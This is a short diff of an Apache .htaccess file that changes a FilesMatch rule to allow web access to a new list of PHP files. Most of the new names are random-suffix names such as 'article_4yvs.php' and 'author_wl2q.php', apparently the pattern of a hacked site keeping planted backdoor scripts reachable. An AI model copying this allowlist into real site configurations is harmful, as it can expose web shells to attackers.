@@ -84,7 +84,7 @@ Options -Indexes
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(GrabberCalculator.php|fc-pluginSettings-1-acronplugin.php|AdminHandler.php|ResolverHelper.php|CatalogCategoryGridHandler.js|index.php)$"> 
+<FilesMatch "^(GroupBasedAbstract.php|autoload_data.php|getallheaders.inc.php|article_4yvs.php|article_6u5x.php|author_wl2q.php|article_lf3g.php|author_6w0t.php|article_xohd.php|author_b32s.php|editor_9kz3.php|review_3awp.php|submission_dezu.php|article_0k39.php|index.php)$"> 
 Order Allow,Deny 
 Allow from all 
 </FilesMatch>
